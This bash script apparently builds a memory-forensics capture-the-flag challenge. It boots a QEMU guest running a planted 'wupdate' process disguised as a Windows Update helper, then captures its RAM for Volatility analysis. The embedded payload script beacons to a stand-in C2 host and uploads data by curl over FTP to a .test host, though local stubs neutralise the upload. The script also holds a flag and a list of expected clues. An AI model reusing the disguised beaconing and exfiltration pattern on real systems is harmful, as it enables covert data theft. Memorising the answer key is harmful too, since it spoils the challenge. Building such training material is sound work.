#!/usr/bin/env bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

target="${1:-$PROJECT_ROOT/generated/m1/evidence/endpoint.vmem}"
mem_mb="${GRIDSHIELD_M1_MEMORY_MB:-512}"
kernel_version="${GRIDSHIELD_M1_ACQ_KERNEL:-5.15.0-125-generic}"
kernel="/boot/vmlinuz-$kernel_version"
system_map="/boot/System.map-$kernel_version"
kernel_config="/boot/config-$kernel_version"
work="$(mktemp -d)"
qemu_pid=""

cleanup() {
  if [[ -n "${qemu_pid:-}" ]] && kill -0 "$qemu_pid" 2>/dev/null; then
    kill "$qemu_pid" 2>/dev/null || true
    wait "$qemu_pid" 2>/dev/null || true
  fi
  rm -rf "$work"
}
trap cleanup EXIT

need() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "Missing required command: $1" >&2
    exit 2
  }
}

need gcc
need qemu-system-x86_64
need cpio
need gzip
need socat
need busybox

if ! sudo test -r "$kernel"; then
  if sudo test -f /etc/apt/sources.list.d/ddebs.list; then
    sudo sed -i '/ddebs\.ubuntu\.com .*security/d' /etc/apt/sources.list.d/ddebs.list
  fi
  sudo apt-get update
  sudo apt-get install -y "linux-image-$kernel_version"
fi
if [[ ! -r "$kernel" ]]; then
  sudo test -r "$kernel" || {
    echo "Cannot read $kernel" >&2
    exit 3
  }
  sudo cp "$kernel" "$work/vmlinuz"
  sudo chown "$(id -u):$(id -g)" "$work/vmlinuz"
else
  cp "$kernel" "$work/vmlinuz"
fi

root="$work/initramfs"
mkdir -p "$root"/{bin,sbin,etc,proc,sys,dev,run,tmp,tmp/.cache,usr/bin,usr/local/lib,dev/shm,var/log}
chmod 1777 "$root/tmp"

copy_path() {
  local src="$1"
  local dst="$root$src"
  mkdir -p "$(dirname "$dst")"
  cp -L "$src" "$dst"
}

copy_binary_to() {
  local src="$1"
  local dst="$2"
  mkdir -p "$(dirname "$root$dst")"
  cp -L "$src" "$root$dst"
  chmod 0755 "$root$dst"
  (ldd "$src" 2>/dev/null || true) | awk '{ for (i = 1; i <= NF; i++) if ($i ~ /^\//) print $i }' | sort -u | while read -r lib; do
    [[ -n "$lib" && -e "$lib" ]] && copy_path "$lib"
  done
}

copy_binary_to /bin/bash /bin/bash
copy_binary_to "$(command -v busybox)" /bin/busybox
for app in sh mount umount mkdir sleep date rm cat echo hostname mknod chmod ln ps dmesg true false; do
  ln -sf /bin/busybox "$root/bin/$app"
done
for app in mktemp printf; do
  ln -sf /bin/busybox "$root/usr/bin/$app"
done

cat > "$work/wupdate_vm.c" <<'C'
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static volatile int running = 1;
static volatile char *runtime_script = NULL;
static volatile char *process_note = NULL;

static const char script_template[] =
"#!/bin/bash\n"
"\n"
"AGENT_ID=\"ep-009\"\n"
"HOST_ID=\"cbfs01\"\n"
"C2_HOST=\"update.gridvault-records.test\"\n"
"FTP_HOST=\"ftp.gridvault-records.test\"\n"
"FTP_USER=\"sitebackup\"\n"
"ARCHIVE_KEY=\"4a7f3c91b2d0e865\"\n"
"ARCHIVE_CIPHER=\"aes-256-cbc\"\n"
"ARCHIVE_KDF=\"pbkdf2\"\n"
"INTERVAL=20\n"
"CACHE=\"/tmp/.cache\"\n"
"ARCHIVE_PATH=\"$CACHE/archive.enc\"\n"
"\n"
"mkdir -p \"$CACHE\"\n"
"count=0\n"
"\n"
"while true; do\n"
"    getent hosts \"$C2_HOST\" >/dev/null 2>&1\n"
"\n"
"    printf \"agent=%s\\nhost=%s\\ncount=%d\\nutc=%d\\ndataset=supervision,payments,hr\\n\" \\\n"
"        \"$AGENT_ID\" \"$HOST_ID\" \"$count\" \"$(date +%s)\" > \"$CACHE/pulse.txt\"\n"
"\n"
"    NETRC_FILE=\"$(mktemp /dev/shm/.wupd_netrc.XXXXXX)\"\n"
"\n"
"    /usr/local/lib/wupd_cred_helper \\\n"
"        --profile cbfs01 \\\n"
"        --host \"$FTP_HOST\" \\\n"
"        --user \"$FTP_USER\" \\\n"
"        --netrc \"$NETRC_FILE\"\n"
"\n"
"    curl -s --connect-timeout 3 \\\n"
"        --netrc-file \"$NETRC_FILE\" \\\n"
"        --ftp-create-dirs \\\n"
"        -T \"$CACHE/pulse.txt\" \\\n"
"        \"ftp://${FTP_HOST}/incoming/${AGENT_ID}.txt\"\n"
"\n"
"    shred -u \"$NETRC_FILE\" 2>/dev/null || rm -f \"$NETRC_FILE\"\n"
"\n"
"    count=$((count+1))\n"
"    sleep \"$INTERVAL\"\n"
"done\n";

static void stop(int sig) {
  (void)sig;
  running = 0;
}

static void write_runtime_script(const char *path) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
  if (fd < 0) {
    return;
  }
  (void)write(fd, script_template, sizeof(script_template) - 1);
  close(fd);
}

int main(void) {
  const char *path = "/tmp/.cache/wupdate.runtime";
  pid_t child;
  prctl(PR_SET_NAME, "wupdate", 0, 0, 0);
  signal(SIGTERM, stop);
  signal(SIGINT, stop);

  runtime_script = calloc(1, sizeof(script_template) + 512);
  process_note = calloc(1, 2048);
  if (!runtime_script || !process_note) {
    return 2;
  }
  memcpy((char *)runtime_script, script_template, sizeof(script_template));
  snprintf((char *)process_note, 2048,
           "comm=wupdate pid_hint=1337 host=cbfs01 agent=ep-009 interval=20 "
           "service=/etc/systemd/system/wupdate.service helper=/usr/local/lib/wupd_cred_helper "
           "archive_path=/tmp/.cache/archive.enc archive_cipher=aes-256-cbc archive_kdf=pbkdf2 "
           "dataset=supervision,payments,hr "
           "flags=CTF{SCRIPT_RECOVERED_RUNTIME_CREDS_NOT_HARDCODED}");

  mkdir("/tmp/.cache", 0755);
  write_runtime_script(path);
  child = fork();
  if (child == 0) {
    execl("/bin/bash", "wupdate-script", path, (char *)NULL);
    _exit(127);
  }

  while (running) {
    sleep(5);
  }
  if (child > 0) {
    kill(child, SIGTERM);
    waitpid(child, NULL, 0);
  }
  return runtime_script && process_note ? 0 : 1;
}
C
gcc -O0 -g -Wall -Wextra -o "$work/wupdate" "$work/wupdate_vm.c"
copy_binary_to "$work/wupdate" /usr/bin/wupdate

cat > "$root/usr/local/lib/wupd_cred_helper" <<'SH'
#!/bin/bash
profile=""
host=""
user=""
netrc=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    --profile) profile="$2"; shift 2 ;;
    --host) host="$2"; shift 2 ;;
    --user) user="$2"; shift 2 ;;
    --netrc) netrc="$2"; shift 2 ;;
    *) shift ;;
  esac
done
[ "$profile" = "cbfs01" ] || exit 2
[ -n "$host" ] && [ -n "$user" ] && [ -n "$netrc" ] || exit 3
{
  printf 'machine %s\n' "$host"
  printf 'login %s\n' "$user"
  printf 'password supplied-at-runtime\n'
} > "$netrc"
chmod 600 "$netrc"
exit 0
SH
chmod 0711 "$root/usr/local/lib/wupd_cred_helper"

cat > "$root/usr/bin/getent" <<'SH'
#!/bin/bash
if [ "$1" = "hosts" ] && [ -n "$2" ]; then
  printf '198.51.100.20 %s\n' "$2"
  exit 0
fi
exit 1
SH
chmod 0755 "$root/usr/bin/getent"

cat > "$root/usr/bin/curl" <<'SH'
#!/bin/bash
upload=""
url=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    -T) upload="$2"; shift 2 ;;
    ftp://*) url="$1"; shift ;;
    *) shift ;;
  esac
done
{
  printf 'curl_upload=%s\n' "$url"
  [ -n "$upload" ] && cat "$upload" 2>/dev/null || true
} >> /tmp/.cache/upload.trace
exit 0
SH
chmod 0755 "$root/usr/bin/curl"

cat > "$root/usr/bin/shred" <<'SH'
#!/bin/bash
last=""
for arg in "$@"; do
  last="$arg"
done
[ -n "$last" ] && rm -f "$last"
exit 0
SH
chmod 0755 "$root/usr/bin/shred"

cat > "$root/etc/passwd" <<'TXT'
root:x:0:0:root:/root:/bin/sh
TXT
cat > "$root/etc/group" <<'TXT'
root:x:0:
TXT
cat > "$root/etc/systemd-system-wupdate.service" <<'TXT'
[Unit]
Description=Windows Update Compatibility Helper
[Service]
ExecStart=/usr/bin/wupdate
TXT

cat > "$root/init" <<'SH'
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs devtmpfs /dev 2>/dev/null || true
[ -c /dev/null ] || mknod -m 666 /dev/null c 1 3
[ -c /dev/console ] || mknod -m 600 /dev/console c 5 1
mkdir -p /dev/shm /tmp/.cache
mount -t tmpfs tmpfs /dev/shm 2>/dev/null || true
hostname cbfs01
echo "GRIDSHIELD_M1_BOOT cbfs01 physical-memory-acquisition"
/usr/bin/wupdate &
echo "GRIDSHIELD_READY wupdate-started"
while true; do
  sleep 60
done
SH
chmod 0755 "$root/init"

(cd "$root" && find . -print0 | cpio --null -o --format=newc 2>/dev/null) | gzip -9 > "$work/initramfs.cpio.gz"

monitor="$work/qemu-monitor.sock"
serial="$work/serial.log"
qemu-system-x86_64 \
  -accel tcg \
  -m "$mem_mb" \
  -nodefaults \
  -no-reboot \
  -nographic \
  -serial "file:$serial" \
  -monitor "unix:$monitor,server,nowait" \
  -kernel "$work/vmlinuz" \
  -initrd "$work/initramfs.cpio.gz" \
  -append "console=ttyS0 nokaslr quiet panic=-1" &
qemu_pid="$!"

for _ in $(seq 1 90); do
  if grep -q 'GRIDSHIELD_READY' "$serial" 2>/dev/null; then
    break
  fi
  if ! kill -0 "$qemu_pid" 2>/dev/null; then
    echo "QEMU exited before memory acquisition" >&2
    sed -n '1,160p' "$serial" >&2 || true
    exit 4
  fi
  sleep 1
done
grep -q 'GRIDSHIELD_READY' "$serial" || {
  echo "Timed out waiting for wupdate in the acquisition guest" >&2
  sed -n '1,200p' "$serial" >&2 || true
  exit 5
}

mkdir -p "$(dirname "$target")"
tmp_target="$target.tmp"
rm -f "$tmp_target"
size_hex="$(printf '0x%x' "$((mem_mb * 1024 * 1024))")"
monitor_out="$work/monitor.out"
timeout 10s bash -c 'printf "pmemsave 0 %s \"%s\"\n" "$1" "$2" | socat - "UNIX-CONNECT:$3"' \
  _ "$size_hex" "$tmp_target" "$monitor" >"$monitor_out" 2>&1 || true
for _ in $(seq 1 120); do
  if [[ -s "$tmp_target" ]]; then
    break
  fi
  sleep 1
done
if [[ ! -s "$tmp_target" ]]; then
  echo "QEMU monitor did not produce the physical memory image" >&2
  sed -n '1,120p' "$monitor_out" >&2 || true
  sed -n '1,200p' "$serial" >&2 || true
  exit 8
fi
timeout 5s bash -c 'printf "quit\n" | socat - "UNIX-CONNECT:$1"' _ "$monitor" >/dev/null 2>&1 || true
wait "$qemu_pid" 2>/dev/null || true
qemu_pid=""

mv "$tmp_target" "$target"
chmod 0444 "$target"

vol_dir="$(dirname "$target")/volatility"
mkdir -p "$vol_dir"
{
  echo "Evidence Item: endpoint.vmem"
  echo "Acquisition Type: Full guest physical RAM image"
  echo "Acquisition Method: QEMU monitor pmemsave from controlled cbfs01 acquisition guest"
  echo "Acquisition Time: 2026-05-15T04:10:00+05:30"
  echo "Kernel Version: $kernel_version"
  echo "Kernel Banner Note: Linux banner dates are Ubuntu kernel build metadata, not incident timestamps."
  echo "Kernel Command Line: console=ttyS0 nokaslr quiet panic=-1"
  echo "Memory Size MB: $mem_mb"
  echo "Primary Analysis: Volatility 3 banners.Banners, linux.pslist/linux.psaux/linux.pstree, then process memory dumping"
  echo "Safety Note: This image is captured from an isolated acquisition guest, not the Docker host."
} > "$vol_dir/capture_manifest.txt"
if sudo test -r "$system_map"; then
  sudo cp "$system_map" "$vol_dir/System.map-$kernel_version"
  sudo chown "$(id -u):$(id -g)" "$vol_dir/System.map-$kernel_version"
  chmod 0444 "$vol_dir/System.map-$kernel_version"
fi
if sudo test -r "$kernel_config"; then
  sudo cp "$kernel_config" "$vol_dir/config-$kernel_version"
  sudo chown "$(id -u):$(id -g)" "$vol_dir/config-$kernel_version"
  chmod 0444 "$vol_dir/config-$kernel_version"
fi
if [[ "$kernel_version" == "5.15.0-125-generic" ]]; then
  symbol_file="Ubuntu_5.15.0-125-generic_5.15.0-125.135_amd64.json.xz"
  symbol_url="https://raw.githubusercontent.com/Abyss-W4tcher/volatility3-symbols/master/Ubuntu/amd64/5.15.0/125/generic/${symbol_file}"
  if ! curl -fsSL "$symbol_url" -o "$vol_dir/$symbol_file"; then
    rm -f "$vol_dir/$symbol_file"
    cat > "$vol_dir/SYMBOL_DOWNLOAD_FAILED.txt" <<TXT
The acquisition guest uses $kernel_version, but the prebuilt Volatility symbol
download failed. Re-run this build with internet access or provide the matching
Ubuntu_5.15.0-125-generic_5.15.0-125.135_amd64.json.xz file manually.
TXT
  else
    chmod 0444 "$vol_dir/$symbol_file"
  fi
fi
cat > "$vol_dir/README.txt" <<TXT
endpoint.vmem is a full guest physical RAM capture from a controlled cbfs01 acquisition guest.

Use Volatility 3 first. If this directory contains a *.json.xz symbol table,
point Volatility at this directory with --symbol-dirs. If the symbol table is absent,
run scripts/build-volatility-symbols.sh on the build host and rebuild the evidence package.

The acquisition guest uses this kernel version:
$kernel_version
TXT

tmp_strings="$work/endpoint.strings"
strings -a -n 8 "$target" > "$tmp_strings"
for pat in 'Linux version' 'GRIDSHIELD_READY' 'wupdate' 'ep-009' 'cbfs01' 'INTERVAL=20' \
           'update.gridvault-records.test' 'ftp.gridvault-records.test' 'sitebackup' \
           '4a7f3c91b2d0e865' 'aes-256-cbc' 'pbkdf2' '/tmp/.cache/archive.enc' 'wupd_cred_helper' 'supervision,payments,hr' \
           'CTF{SCRIPT_RECOVERED_RUNTIME_CREDS_NOT_HARDCODED}'; do
  grep -F "$pat" "$tmp_strings" >/dev/null || {
    echo "Full memory image is missing expected clue: $pat" >&2
    exit 6
  }
done
if grep -F 'Str0ng#Bkp2024' "$tmp_strings" >/dev/null; then
  echo "Full memory image leaked the FTP password" >&2
  exit 7
fi
